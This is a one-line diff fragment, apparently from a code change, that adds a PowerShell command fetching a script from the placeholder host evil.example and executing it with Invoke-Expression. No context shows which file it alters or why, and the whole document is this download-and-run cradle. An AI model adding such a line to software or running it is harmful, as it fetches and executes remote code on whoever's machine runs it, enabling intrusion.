@@ -1,0 +1,1 @@
+Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')
